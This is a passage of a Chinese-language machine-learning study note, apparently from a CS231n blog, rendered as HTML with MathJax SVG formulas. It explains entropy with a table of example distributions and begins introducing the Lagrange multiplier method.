640Q965 609 976 579T993 533T999 516H979L959 517Q936 579 886 621T777 682Q724 700 655 705T436 710H319Q183 710 183 709Q186 706 348 484T511 259Q517 250 513 244L490 216Q466 188 420 134T330 27L149 -187Q149 -188 362 -188Q388 -188 436 -188T506 -189Q679 -189 778 -162T936 -43Q946 -27 959 6H999L913 -249L489 -250Q65 -250 62 -248Q56 -246 56 -239Q56 -234 118 -161Q186 -81 245 -11L428 206Q428 207 242 462L57 717L56 728Q56 744 61 748Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(1089,477.1) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"1D45B\" d=\"M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"TeXAtom\" transform=\"translate(1089,-285.4) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(345,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(1123,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g></g><g data-mml-node=\"msub\" transform=\"translate(7249.5,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mi\" transform=\"translate(8246.1,0)\"><path data-c=\"6C\" d=\"M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z\"/><path data-c=\"6F\" d=\"M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z\" transform=\"translate(278,0)\"/><path data-c=\"67\" d=\"M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z\" transform=\"translate(778,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(9524.1,0)\"><path data-c=\"2061\" d=\"\"/></g><g data-mml-node=\"msub\" transform=\"translate(9690.8,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g></g></svg></mjx-container></span></p>\n<p>其中：</p>\n<ul>\n<li><span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.856ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"4.407ex\" height=\"2.427ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -694 1947.9 1072.5\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"6C\" d=\"M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z\"/><path data-c=\"6F\" d=\"M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z\" transform=\"translate(278,0)\"/><path data-c=\"67\" d=\"M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z\" transform=\"translate(778,0)\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(1311,-241.4) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g></g></g></g></svg></mjx-container></span>\n表示这个事件<strong>意外程度（不确定性）</strong>。发生的概率越小，就越意外。</li>\n<li><span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.856ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"6.662ex\" height=\"2.427ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -694 2944.5 1072.5\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"msub\" transform=\"translate(996.6,0)\"><g data-mml-node=\"mi\"><path data-c=\"6C\" d=\"M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z\"/><path data-c=\"6F\" d=\"M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z\" transform=\"translate(278,0)\"/><path data-c=\"67\" d=\"M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z\" transform=\"translate(778,0)\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(1311,-241.4) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g></g></g></g></svg></mjx-container></span>\n是对以外程度的加权平均。</li>\n<li>加个符号是因为 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.856ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"4.407ex\" height=\"2.427ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -694 1947.9 1072.5\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"6C\" d=\"M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z\"/><path data-c=\"6F\" d=\"M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z\" transform=\"translate(278,0)\"/><path data-c=\"67\" d=\"M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z\" transform=\"translate(778,0)\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(1311,-241.4) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g></g></g></g></svg></mjx-container></span>\n是负数（ <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.439ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.878ex\" height=\"1.439ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -442 830 636\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g></g></svg></mjx-container></span>\n是概率，小于等于1）</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th><strong>分布情况</strong></th>\n<th><strong>示例</strong></th>\n<th><strong>熵</strong></th>\n<th><strong>含义</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>完全确定</td>\n<td>p = [1, 0, 0]</td>\n<td>H = 0</td>\n<td>已知结果，无不确定性</td>\n</tr>\n<tr>\n<td>等概率分布</td>\n<td>p = [1/3, 1/3, 1/3]</td>\n<td>最大熵</td>\n<td>完全随机，最不确定</td>\n</tr>\n<tr>\n<td>偏斜分布</td>\n<td>p = [0.9, 0.05, 0.05]</td>\n<td>较小熵</td>\n<td>有偏好，少量不确定性</td>\n</tr>\n</tbody>\n</table>\n<p>在等概率分布的情况下，事件情况越多，熵越大。（直觉上就是越混乱，每个事件之间越平等）</p>\n<figure>\n<img src=\"/cs231n/01/Entropy%20vs.%20Number%20of%20Equally%20Likely%20Outcomes.png\" alt=\"Entropy vs. Number of Equally Likely Outcomes\">\n<figcaption aria-hidden=\"true\">Entropy vs. Number of Equally Likely\nOutcomes</figcaption>\n</figure>\n<h2 id=\"拉格朗日乘子法\">拉格朗日乘子法</h2>\n<p>用于求解<strong>带约束</strong>的优化问题。（优化问题就是求某个函数的极值、最值等，即求导等于0的点）</p>\n<p>拉格朗日法核心思想是，把约束合并进目标函数（成为拉格朗日函数），然后对拉格朗日函数求导。</p>\n<p>因为加进去的约束数值上都是0，拉格朗日函数的极值点一定也是原目标函数的极值点。</p>\n<p>例：</p>\n<p>求 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"11.833ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 5230.2 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D453\" d=\"M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(550,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(939,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1511,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1955.7,0)\"><path data-c=\"1D466\" d=\"M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 